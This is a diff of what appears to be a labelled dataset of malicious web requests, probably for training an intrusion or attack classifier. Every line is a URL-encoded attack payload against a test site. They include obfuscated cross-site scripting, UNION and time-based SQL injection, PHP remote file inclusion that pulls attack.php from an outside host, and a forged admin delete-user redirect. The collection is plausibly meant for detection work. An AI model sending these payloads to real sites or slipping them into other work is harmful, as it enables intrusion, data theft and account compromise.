@@ -1,3 +1,6 @@
+2 /test/website/register.php?password=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E
+2 /test/website/index.php?username=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E
+2 /test/website/?username=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&name=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&
 3 /test/website/?pid={${include_once(http://www.attackwebsite.com/attack.php)}}?item={${array()}}?pid={${exit(legion's)}}?id={${die()}}?response={${die()}}?secure={${unset()}}?balance=http://www.attackwebsite.com/attack.php?item=http://www.attackwebsite.com/attack.php?accountID=http://www.attackwebsite.com/attack.php?email=http://www.attackwebsite.com/attack.php?password=http://www.attackwebsite.com/attack.php
 3 /test/website/%3Fpid%3D%7B%24%7Binclude_once%28http%3A//www.attackwebsite.com/attack.php%29%7D%7D%3Fitem%3D%7B%24%7Barray%28%29%7D%7D%3Fpid%3D%7B%24%7Bexit%28legion%27s%29%7D%7D%3Fid%3D%7B%24%7Bdie%28%29%7D%7D%3Fresponse%3D%7B%24%7Bdie%28%29%7D%7D%3Fsecure%3D%7B%24%7Bunset%28%29%7D%7D%3Fbalance%3Dhttp%3A//www.attackwebsite.com/attack.php%3Fitem%3Dhttp%3A//www.attackwebsite.com/attack.php%3FaccountID%3Dhttp%3A//www.attackwebsite.com/attack.php%3Femail%3Dhttp%3A//www.attackwebsite.com/attack.php%3Fpassword%3Dhttp%3A//www.attackwebsite.com/attack.php
 1 /test/website/post.php?page=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20UdVG
@@ -91,12 +94,9 @@
 1 /test/website/post.php?page=1%22%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZlk%29%20AND%20%28%28%28%22RCqz%22%20LIKE%20%22RCqz
 1 /test/website/post.php?page=1%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20bbyZ
 2 /test/website/index.php?password=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E
-2 /test/website/register.php?password=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E
 2 /test/website/register.php?username=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser
 2 /test/website/index.php?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js
 2 /test/website/index.php?password=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS
-2 /test/website/index.php?username=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E
-2 /test/website/?username=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&name=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E&
 2 /test/website/register.php?password=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E
 2 /test/website/?name=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E
 2 /test/website/index.php?password=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E
